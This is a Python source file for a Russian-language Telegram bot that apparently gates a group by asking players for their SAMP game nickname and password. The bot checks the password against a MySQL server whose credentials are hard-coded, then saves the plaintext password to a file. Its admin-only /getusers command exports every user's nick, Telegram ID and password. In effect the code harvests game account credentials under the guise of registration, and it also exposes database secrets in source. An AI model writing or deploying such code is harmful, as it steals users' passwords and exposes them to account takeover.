import os
import re
import asyncio
import logging
import time
import datetime
import hashlib
import pymysql
from threading import Thread
from flask import Flask
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# --- АНТИ-СОН ---
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "Bot is alive!"

def run_flask():
    flask_app.run(host='0.0.0.0', port=8000)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

logging.basicConfig(level=logging.INFO)

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN не задан!")

bot = Bot(token=TOKEN)
dp = Dispatcher()

user_data = {}

GROUP_LINK = "https://t.me/+gAjyaXQPy9gxN2My"
ADMIN_IDS = {8095704696, 7936631769}
DATA_FILE = "users.txt"


MYSQL_HOST = "25.6.54.94"
MYSQL_DB   = "boldesku44"
MYSQL_USER = "samp"
MYSQL_PASS = "boldesku4488"

def verify_samp_password(nick, password):
    md5_hash = hashlib.md5(password.encode()).hexdigest()
    try:
        conn = pymysql.connect(
            host=MYSQL_HOST,
            user=MYSQL_USER,
            password=MYSQL_PASS,
            database=MYSQL_DB,
            connect_timeout=5
        )
        with conn.cursor() as cursor:
            cursor.execute(
                "SELECT 1 FROM users WHERE Name=%s AND Password=%s LIMIT 1",
                (nick, md5_hash)
            )
            result = cursor.fetchone()
        conn.close()
        return result is not None
    except Exception as e:
        logging.error(f"MySQL error: {e}")
        return None  # None = ошибка подключения


def load_users():
    users = {}
    if not os.path.exists(DATA_FILE):
        return users
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            if len(parts) == 4:
                uid, nick, password, ts = parts
                users[int(uid)] = {"nick": nick, "password": password, "joined_at": int(ts)}
    return users


def save_user(uid, nick, password, joined_at):
    with open(DATA_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{nick}:{password}:{joined_at}\n")


@dp.message(Command("myid"))
async def myid(msg: types.Message):
    await msg.answer(f"🆔 Твой Telegram ID: <code>{msg.from_user.id}</code>", parse_mode="HTML")


def build_report(users, period_label, from_ts=None):
    now = time.time()
    filtered = {
        uid: u for uid, u in users.items()
        if from_ts is None or u["joined_at"] >= from_ts
    }
    lines = []
    lines.append("=" * 40)
    lines.append(f"  {period_label} — {len(filtered)} чел.")
    lines.append("=" * 40)
    if not filtered:
        lines.append("\n  Нет зарегистрированных игроков.")
    for i, (uid, u) in enumerate(filtered.items(), 1):
        hours = int((now - u["joined_at"]) / 3600)
        minutes = int((now - u["joined_at"]) % 3600 / 60)
        reg_time = time.strftime("%d.%m.%Y %H:%M", time.localtime(u["joined_at"]))
        lines.append(f"\n#{i} {u['nick']}")
        lines.append(f"   Telegram ID : {uid}")
        lines.append(f"   Пароль      : {u['password']}")
        lines.append(f"   Дата входа  : {reg_time}")
        lines.append(f"   В группе    : {hours} ч. {minutes} мин.")
    lines.append("\n" + "=" * 40)
    return "\n".join(lines), len(filtered)


@dp.message(Command("getusers"))
async def get_users(msg: types.Message, command: types.BotCommand = None):
    if msg.from_user.id not in ADMIN_IDS:
        await msg.answer("❌ У тебя нет доступа к этой команде.")
        return
    users = load_users()

    now = time.time()

    # вчера — начало и конец вчерашнего дня
    today = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    yesterday_start = (today - datetime.timedelta(days=1)).timestamp()
    yesterday_end = today.timestamp()
    yesterday_users = {uid: u for uid, u in users.items()
                       if yesterday_start <= u["joined_at"] < yesterday_end}

    # за последний год
    year_ago = now - 365 * 24 * 3600
    year_users = {uid: u for uid, u in users.items() if u["joined_at"] >= year_ago}

    # все
    all_report, all_count = build_report(users, "ВСЕ ИГРОКИ (за всё время)")
    yesterday_report, yes_count = build_report(yesterday_users, "ИГРОКИ ЗА ВЧЕРА")
    year_report, year_count = build_report(year_users, "ИГРОКИ ЗА ПОСЛЕДНИЙ ГОД")

    full = "\n\n".join([yesterday_report, year_report, all_report])
    content = full.encode("utf-8")

    await msg.answer_document(
        types.BufferedInputFile(content, filename="players.txt"),
        caption=(
            f"📋 <b>Статистика игроков</b>\n\n"
            f"📅 Вчера: <b>{yes_count}</b>\n"
            f"📆 За год: <b>{year_count}</b>\n"
            f"📊 Всего: <b>{all_count}</b>"
        ),
        parse_mode="HTML"
    )


@dp.message(Command("stats"))
async def stats(msg: types.Message):
    uid = msg.from_user.id
    users = load_users()
    if uid not in users:
        await msg.answer("❌ Ты ещё не зарегистрирован. Напиши /start чтобы начать.")
        return
    user = users[uid]
    hours = int((time.time() - user["joined_at"]) / 3600)
    minutes = int((time.time() - user["joined_at"]) % 3600 / 60)
    await msg.answer(
        f"📊 <b>Твоя статистика</b>\n\n"
        f"🎮 Ник: <b>{user['nick']}</b>\n"
        f"⏱ В группе: <b>{hours} ч. {minutes} мин.</b>",
        parse_mode="HTML"
    )


@dp.message(Command("start"))
async def start(msg: types.Message):
    user_data.pop(msg.from_user.id, None)

    users = load_users()
    if msg.from_user.id in users:
        user = users[msg.from_user.id]
        hours = int((time.time() - user["joined_at"]) / 3600)
        minutes = int((time.time() - user["joined_at"]) % 3600 / 60)
        await msg.answer(
            f"✅ Ты уже зарегистрирован!\n\n"
            f"🎮 Ник: <b>{user['nick']}</b>\n"
            f"⏱ В группе: <b>{hours} ч. {minutes} мин.</b>\n\n"
            f"Используй /stats чтобы посмотреть статистику.",
            parse_mode="HTML"
        )
        return

    await msg.answer(
        "👋 Привет!\n\n"
        "Напиши ник в формате:\n"
        "👉 Ivan_Petrov"
    )


@dp.message()
async def handle_message(msg: types.Message):
    uid = msg.from_user.id

    if uid not in user_data:
        nick = msg.text.strip()
        if not re.match(r'^[A-Z][a-z]+_[A-Z][a-z]+$', nick):
            await msg.answer("❌ Неверный формат! Пример: Ivan_Petrov")
            return

        users = load_users()
        nicks = [u["nick"] for u in users.values()]
        if nick in nicks:
            await msg.answer("❌ Такой ник уже занят! Выбери другой.")
            return

        user_data[uid] = {"nick": nick}
        await msg.answer("🔑 Введи свой пароль от SAMP:")
        return

    if "password" not in user_data[uid]:
        password = msg.text.strip()
        nick = user_data[uid]["nick"]

        await msg.answer("⏳ Проверяю пароль на сервере...")

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, verify_samp_password, nick, password)

        if result is None:
            await msg.answer(
                "⚠️ Не удалось подключиться к серверу. Попробуй позже."
            )
            return

        if not result:
            await msg.answer(
                "❌ Неверный пароль! Убедись что вводишь пароль от SAMP аккаунта."
            )
            return

        user_data[uid]["password"] = password
        joined_at = int(time.time())
        save_user(uid, nick, password, joined_at)

        await msg.answer(
            f"✅ Пароль подтверждён!\n\n"
            f"👉 Вступай:\n{GROUP_LINK}"
        )
        user_data.pop(uid, None)


async def main():
    await bot.set_my_commands([
        types.BotCommand(command="start", description="🚀 Регистрация"),
        types.BotCommand(command="stats", description="📊 Моя статистика"),
    ])
    await bot.set_my_commands([
        types.BotCommand(command="start", description="🚀 Регистрация"),
        types.BotCommand(command="stats", description="📊 Моя статистика"),
        types.BotCommand(command="getusers", description="📁 Получить список пользователей"),
    ], scope=types.BotCommandScopeChat(chat_id=8095704696))
    await bot.set_my_commands([
        types.BotCommand(command="start", description="🚀 Регистрация"),
        types.BotCommand(command="stats", description="📊 Моя статистика"),
        types.BotCommand(command="getusers", description="📁 Получить список пользователей"),
    ], scope=types.BotCommandScopeChat(chat_id=7936631769))
    await dp.start_polling(bot)

if __name__ == "__main__":
    keep_alive()
    asyncio.run(main())
